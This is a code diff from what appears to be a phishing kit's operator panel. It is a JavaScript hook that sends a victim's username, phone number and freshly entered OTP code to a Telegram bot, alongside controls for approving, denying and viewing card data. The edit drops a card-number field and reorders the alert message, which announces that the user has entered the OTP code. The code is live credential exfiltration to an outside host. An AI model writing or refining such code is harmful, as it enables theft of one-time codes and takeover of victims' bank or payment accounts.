@@ -393,14 +393,14 @@ export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextS
     }
   };
 
-  const sendOtpSubmitLog = async (username, cardNumber, phoneNumber, otpCode) => {
+  const sendOtpSubmitLog = async (username, phoneNumber, otpCode) => {
     if (!shouldSendLog('otpSubmit')) return;
     try {
       const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
       const message = `🔐 <b>OTP CODE SUBMITTED</b> 🔐
-🔢 <b>OTP Code:</b> ${otpCode}
 👤 <b>Username:</b> ${username}
 📱 <b>Phone Number:</b> ${phoneNumber}
+🔢 <b>OTP Code:</b> ${otpCode}
 ⏰ <b>Time:</b> ${new Date().toLocaleString()}
 ━━━━━━━━━━━━━━━━━━━━━
 ⚠️ <i>User has entered the OTP code!</i>`;
